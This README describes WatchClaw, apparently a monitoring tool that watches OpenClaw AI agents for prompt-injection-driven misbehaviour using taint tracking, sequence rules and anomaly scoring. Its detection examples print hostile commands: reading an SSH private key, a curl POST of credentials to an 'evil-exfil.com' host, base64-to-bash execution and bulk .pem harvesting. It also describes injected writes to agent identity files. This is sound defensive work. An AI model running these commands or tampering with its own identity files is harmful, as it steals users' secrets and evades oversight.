# WatchClaw

> **Zeek for the AI Agent era** — behavioral monitoring for OpenClaw agents.

WatchClaw watches what your AI agents actually do: every file read, every shell command, every external request. When behavior deviates from baseline or matches known attack patterns, it alerts you in real time — without touching the agent's execution flow.

---

## Why This Exists

AI agents running on [OpenClaw](https://github.com/openclaw/openclaw) have no external observer. A compromised agent — one that has been hijacked via prompt injection — can quietly read your credentials, exfiltrate data, or overwrite its own identity files. Nothing in OpenClaw's default setup would tell you this happened.

WatchClaw is that observer.

---

## Architecture

```
OpenClaw JSONL Logs
        │
        ▼
┌──────────────┐
│    Parser    │  Parses tool call events from raw logs.
│              │  Extracts file paths and URLs from exec commands
│              │  (cat, head, curl, wget, nc, etc.)
└──────┬───────┘
       │
       ▼
┌──────────────┐
│    Engine    │
│              │
│  ┌─────────┐ │  Tracks sensitivity across events with exponential
│  │  Taint  │ │  decay (half-life 300s). Sensitive file read →
│  │ Tracker │ │  taint propagates to subsequent outgoing requests.
│  └─────────┘ │
│              │
│  ┌─────────┐ │  Detects multi-step attack chains within time windows:
│  │Sequence │ │  read_then_exfil, config_then_escalate,
│  │Detector │ │  external_trigger_chain (cognitive injection)
│  └─────────┘ │
│              │
│  ┌─────────┐ │  Scores each event across 6 signals.
│  │ Scorer  │ │  Learns per-agent behavioral baselines.
│  └─────────┘ │  Decision: NORMAL / NOTICE / ALERT / CRITICAL
└──────┬───────┘
       │
       ▼
┌──────────────┐
│   Alerter    │  Discord webhook, action log, daily report
└──────────────┘
```

### Anomaly Signals

| Signal | Description |
|--------|-------------|
| `time_anomaly` | Activity during unusual hours vs. per-agent learned baseline |
| `user_idle` | Action taken while user appears inactive |
| `resource_anomaly` | Access to sensitive files or known-bad domains (score 0–1) |
| `destination_anomaly` | Known-bad or newly-registered external domains |
| `taint_flow` | Sensitive data read → outgoing request within time window |
| `rate_burst` | Abnormally high action volume in short period |

### Attack Sequence Patterns

| Pattern ID | Trigger Condition |
|------------|-------------------|
| `read_then_exfil` | Sensitive file read → external web/exec request within 120s |
| `config_then_escalate` | Identity/config file write → privileged exec within 60s |
| `external_trigger_chain` | External fetch → SOUL.md / MEMORY.md write (cognitive injection) |

### Hard Rules

| Rule | Description |
|------|-------------|
| `WC-HARD-003` | Obfuscated command execution (`base64 -d \| bash`, encoded payloads) |
| `WC-HARD-004` | Bulk credential harvesting (`find / -name "*.pem"` patterns) |

---

## Detection Capabilities

WatchClaw detects exec-layer attacks with full semantic analysis. The v0.1.1 parser upgrade extracts file paths and URLs directly from shell commands, enabling taint tracking even when agents use exec instead of native tools.

**Verified detections:**

```
cat ~/.ssh/id_rsa
  → file_read, sensitivity=0.95, resource_anomaly=1.0 → ALERT

curl -X POST https://evil-exfil.com/upload -d @credentials.json
  → web_fetch, destination_anomaly=1.0 + taint_flow=0.88 → ALERT

echo 'Y3VybC4uLg==' | base64 -d | bash
  → WC-HARD-003 obfuscated command → ALERT

[Read credentials.json] → [curl evil.com within 120s]
  → read_then_exfil sequence, score boost +0.4 → CRITICAL

[curl pastebin.com] → [Write to SOUL.md]
  → external_trigger_chain (cognitive injection) → CRITICAL
```

---

## Known Limitations

### OpenClaw Does Not Log Tool Arguments

This is the primary constraint of the current v0.1 implementation.

OpenClaw's JSONL log format records that a tool was called, but not its arguments:

```
# What OpenClaw logs:
"embedded run tool start: runId=xxx tool=Read"

# What WatchClaw needs for full detection:
"tool=Read path=/Users/andy/.ssh/id_rsa"
```

**Consequence:** When agents use native `Read` or `web_fetch` tools, WatchClaw sees the event type but not the file path or URL. Semantic analysis is blind for native tool usage. The v0.1.1 exec path extraction is a partial workaround — it gives full visibility for shell-command-level access.

### Alert-Only

WatchClaw observes and alerts. It does not intercept or block. By the time a CRITICAL alert fires, the exec command has already run. This is an intentional design choice — false-positive blocking in an AI agent monitoring tool causes more harm than it prevents.

### Behavioral Baseline Learning Curve

Anomaly scoring depends on a per-agent baseline. New agents start with cold-start priors; baselines improve with a few days of normal operation.

---

## Defense-in-Depth Positioning

Per the [OWASP Gen AI Security Project](https://owasp.org/www-project-top-10-for-large-language-model-applications/), no single technique prevents prompt injection. Effective defense requires multiple layers.

WatchClaw occupies **Layer 3 — Output Behavior Monitoring:**

```
Layer 1 │ Architecture & Permissions
        │ Least privilege, sandboxing, HITL for dangerous ops
        │ → Configure in OpenClaw, not WatchClaw's domain
        │
Layer 2 │ Prompt Engineering
        │ Input delimiters (Spotlighting), post-prompting
        │ → OpenClaw wraps external content in EXTERNAL_UNTRUSTED_CONTENT
        │
Layer 3 │ Behavioral Monitoring  ◄── WatchClaw
        │ Exec-layer taint tracking, sequence detection, anomaly scoring
        │ Provides signals for Human-in-the-Loop review
```

WatchClaw's taint tracking is a **behavioral approximation of Origin Tracing**: instead of tracing which prompt instruction caused a tool call (which requires LLM context access), it traces data flow — did a sensitive resource read precede an outgoing request?

---

## Roadmap

### v0.2 — OpenClaw Plugin (Route B)

The correct long-term architecture is a native OpenClaw plugin using the `before_tool_call` hook (verified in `plugin-sdk/plugins/types.d.ts`):

```typescript
api.registerHook("before_tool_call", async (event, ctx) => {
    // Full parameter visibility — no log parsing needed:
    // Read      → event.params.path
    // web_fetch → event.params.url
    // exec      → event.params.command
    // Write     → event.params.path + event.params.content

    await watchclaw.analyze(event.toolName, event.params, ctx.agentId);

    return undefined;  // Pure monitoring — never blocks
});
```

This eliminates the log-argument blindspot entirely. The Python detection engine (taint, sequences, scoring) can be called as a local sidecar. The plugin ships as `npm install @watchclaw/openclaw-plugin` and registers via `openclaw plugins install`.

**Security note on v0.2:** A `before_tool_call` plugin runs in-process and sees all tool parameters across all agents. Treat it as trusted code. The plugin must not persist raw file contents or response bodies — metadata only.

### Further Directions

- Upstream contribution to OpenClaw: log sanitized tool arguments (file path yes, file contents no; URL domain yes, query params with tokens no)
- Per-agent policy profiles (developer agents tolerate wider exec patterns)
- True Origin Tracing via LLM prompt context access
- Evaluation benchmark for AI agent behavioral monitoring tools

---

## Installation

Requires **Python 3.11+**. macOS ships with Python 3.9 — install a newer version first if needed.

```bash
# Recommended: Homebrew Python (macOS)
brew install python@3.13
pip3.13 install watchclaw

# Or with any Python 3.11+ installation:
python3 -m pip install watchclaw

# Verify:
watchclaw report
```

OpenClaw logs expected at `/tmp/openclaw/`.

```bash
# Start monitoring (reads OpenClaw logs continuously)
watchclaw start

# 24-hour summary: total events, alerts, top agents, rules triggered
watchclaw report

# View specific alerts — the most useful command
watchclaw logs --level ALERT          # all alerts
watchclaw logs --level CRITICAL       # critical only
watchclaw logs --level ALERT --agent melody   # filter by agent
watchclaw logs --tail 50              # last 50 events (any level)

# Per-agent behavioral baseline (what's "normal" for each agent)
watchclaw profile

# Test detection with synthetic attack scenarios
watchclaw simulate

# List all active detection rules
watchclaw rules
```

---

## Project Structure

```
src/watchclaw/
├── parser.py        # OpenClaw JSONL log parser + exec command semantic extraction
├── taint.py         # Sensitivity propagation with exponential decay (half-life 300s)
├── scorer.py        # 6-signal anomaly scoring + per-agent baseline learning
├── sequence.py      # Multi-step attack pattern detection (sliding window)
├── engine.py        # Orchestration
├── rules.py         # Hard rules (WC-HARD-003 obfuscation, WC-HARD-004 harvesting)
├── alerter.py       # Discord webhook + structured action log
└── cli.py           # CLI entry points
tests/               # 307 tests
```

---

## Contributing

Issues and PRs welcome. The most impactful contribution is the v0.2 OpenClaw plugin — the detection engine is ready to be called from a TypeScript hook handler.

## License

MIT
